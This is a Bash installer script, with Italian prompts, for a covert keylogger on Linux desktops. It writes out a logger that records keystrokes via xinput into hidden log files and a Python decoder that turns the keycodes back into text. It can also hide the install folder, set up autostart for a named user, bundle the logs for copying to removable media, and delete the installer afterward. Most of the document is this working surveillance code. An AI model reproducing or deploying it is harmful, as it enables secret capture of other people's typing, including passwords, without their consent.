#!/bin/bash
########################################Config###############################################

folderdef="/home/docente"
hiddendef="n"
autostartdef="n"
userkeyloggeddef="jimmy"
autodetectdef="n"
keyboardstringdef='USB-compliant keyboard'
keyboarddef="10"
isverticaldef="n"
subfolderdef="keylogger"
instremovdef="n"
startautdef="n"

echo "++++++UTILITA' DI INSTALLAZIONE DEL KEYLOGGER++++++"
echo ""
echo "Per le impostazioni di default premere Invio"
echo "Cartella in cui creare il keylogger (default: $folderdef)"
echo "info: la cartella deve già esistere!"

read folder

if [ "$folder" == "" ]
then
folder=$folderdef
fi

clear
echo "Crea in una cartella nascosta (y/n) (default: $hiddendef)"

read hidden

if [ "$hidden" == "" ]
then
hidden=$hiddendef
fi

subfolder=$subfolderdef
if [ "$hidden" == "y" ]
then
subfolder=".$subfolderdef"
fi

clear
echo "Avvio automatico (y/n) (default: $autostartdef)"

read autostart

if [ "$autostart" == "" ]
then
autostart=$autostartdef
fi

if [ "$autostart" == "y" ]
then

clear
echo "Utente che deve loggarsi per l'esecuzione (default: $userkeyloggeddef)"

read userkeylogged

if [ "$userkeylogged" == "" ]
then
userkeylogged=$userkeyloggeddef
fi
fi

clear
echo "Autodetect device tastiera (y/n) (default: $autodetectdef)"

read autodetect

if [ "$autodetect" == "" ]
then
autodetect=$autodetectdef
fi

clear

xinput list

echo ""
if [ "$autodetect" == "y" ]
then 

echo "Inserisci la stringa di riconoscimento (default: $keyboardstringdef)"

keyboard='$device'
read keyboardstring

if [ "$keyboardstring" == "" ]
then
keyboardstring=$keyboardstringdef
fi
fi

if [ "$autodetect" == "n" ]
then

echo "Inserisci l'id del device (default: $keyboarddef)"

keyboardstring=$keyboardstringdef
read keyboard

if [ "$keyboard" == "" ]
then
keyboardstring=$keyboarddef
fi
fi

clear
echo "Vuoi che i caratteri registrati sia visualizzati in verticale (y/n) (default: $isverticaldef)"

read isvertical

if [ "$isvertical" == "" ]
then
isvertical=$isverticaldef
fi

clear

echo "Installazione completata. Riavviare il pc o avviare $folder/$subfolder/keylogger.sh"
echo ""
echo "Avviare lo script? (y/n) (default: $startautdef)"

read startaut

if [ "$startaut" == "" ]
then
startaut=$startautdef
fi

clear

echo "rimuovere l'installatore (y/n) (default: $instremovdef)"

read instremov

if [ "$instremov" == "" ]
then
instremov=$instremovdef
fi

#######################################Program##############################################

#Variable
data=date
address="$folder/$subfolder"
userautoaddress="/home/$userkeylogged/.config/autostart"
keyaddress="$address/keylogger.sh"
pythonaddress="$address/decoder.py"
decoderaddress="$address/keydecoder.sh"
fileaddress="$address/file"
logaddress="$address/log"
desktoplauncher="$userautoaddress/key2.desktop"
remaddress="$address/remover.sh"
keeperaddress="$address/keeper.sh"

mkdir $address
mkdir $fileaddress

#Keylogger
echo "
#!/bin/bash

sleep 1
number=\`ls -a $fileaddress/ | grep -c .xkey.[0-9].log\`
device=\`xinput list | grep \"$keyboardstring\" | grep \"slave  keyboard\" | grep -o \"id=.\" | grep -o \"[0-9]\"\`

xmodmap -pke > $fileaddress/.xkey-map.log

script -c \"xinput test $keyboard\" | cat >> $fileaddress/.xkey.\$number.log &

" > $keyaddress
chmod 777 $keyaddress

#Python Decoder
echo 'import re, collections, sys' > $pythonaddress
echo 'from subprocess import *' >> $pythonaddress
echo 'def keyMap():' >> $pythonaddress
echo "   table = open(\"$fileaddress/.xkey-map.log\")" >> $pythonaddress
echo '   key = []' >> $pythonaddress
echo '   for line in table:' >> $pythonaddress
echo "      m = re.match('keycode +(\d+) = (.+)', line.decode())" >> $pythonaddress
echo '      if m and m.groups()[1]:' >> $pythonaddress
echo '         key.append(m.groups()[1].split()[0]+"_____"+m.groups()[0])' >> $pythonaddress
echo '   return key' >> $pythonaddress
echo 'def printV(letter):' >> $pythonaddress
echo '      key=keyMap();' >> $pythonaddress
echo '      for i in key:' >> $pythonaddress
echo '              if str(letter) == i.split("_____")[1]:' >> $pythonaddress
echo '                     return i.split("_____")[0]' >> $pythonaddress
echo '      return letter' >> $pythonaddress
echo 'if len(sys.argv) < 2:' >> $pythonaddress
echo '        print "Usage: %s FILE" % sys.argv[0];' >> $pythonaddress
echo '        exit();' >> $pythonaddress
echo 'else:' >> $pythonaddress
echo '        f = open(sys.argv[1])' >> $pythonaddress
echo '        lines = f.readlines()' >> $pythonaddress
echo '        f.close()' >> $pythonaddress
echo '        for line in lines:' >> $pythonaddress
echo "                m = re.match('key press +(\d+)', line)" >> $pythonaddress
echo '                if m:' >> $pythonaddress
echo '                          keycode = m.groups()[0]' >> $pythonaddress
echo '                          print (printV(keycode))' >> $pythonaddress

#Decoder
echo "
#!/bin/bash 

vertical=$isvertical

for logfile in \`ls -a $fileaddress | grep .xkey.[0-9].log\`
do

echo \"\"
echo \"Decoding del file \$logfile\"

mkdir $logaddress

id=\`echo \$logfile | grep -o [0-9]\`

python $pythonaddress \"$fileaddress/\$logfile\" > \"$logaddress/log-\$id\"

if [ \$vertical == \"n\" ]

then

sed ':a;N;\$!ba;s/\n/ /g' \"$logaddress/log-\$id\" > \"$logaddress/log-\$id-v\" 
rm \"$logaddress/log-\$id\"

fi

done


echo \"\"
echo \"Fatto\"
" > $decoderaddress

chmod 777 $decoderaddress

#Autostart procedure

if [ "$autostart" == "y" ] 
then

mkdir $userautoaddress

echo "
[Desktop Entry]
Version=1.0
Name=Keylog
Comment=Lancia uno script di keylogging creato da Rossetto Giacomo
Type=Application
Encoding=UTF-8
Terminal=false
Exec=/home/jimmy/Scrivania/script-app/keylogger/keylogger.sh
Icon=lock-utilities-symbolic
Categories=Utility;Application;
" > $desktoplauncher

chmod 777 $desktoplauncher

fi

#Remover

echo "
#!/bin/sh 
echo \"GoodBye =)\"

rm -r $address
rm $desktoplauncher
" > $remaddress

chmod 777 $remaddress

#Keeper

echo "
#!/bin/bash 
copydef=\"n\"
destinationdef=\"/media/sdb1/\"

tarname=\"log.tar\"

echo \"Compressione in corso\"

tar -czvf \$tarname log file

echo \"\"
echo \"Per le impostazioni di default premere Invio\"
echo \"Vuoi inviare il file (y/n) (default: \$copydef)\"

read copy

if [ \"\$copy\" == \"\" ]
then
copy=copydef
fi

if [ \"\$copy\" == \"y\" ]
then 

echo \"Dove vuoi inviarlo (default: \$destinationdef)\"
read destination

if [ \"\$destination\" == \"\" ]
then
destination=destinationdef
fi

cp $tarname $destination
fi
" > $keeperaddress

chmod 777 $keeperaddress

if [ "$instremov" == "y" ]
then
rm -f keylogger-installer.sh
fi

if [ "$startaut" == "y" ]
then
sh ./$keyaddress
exit 0
fi

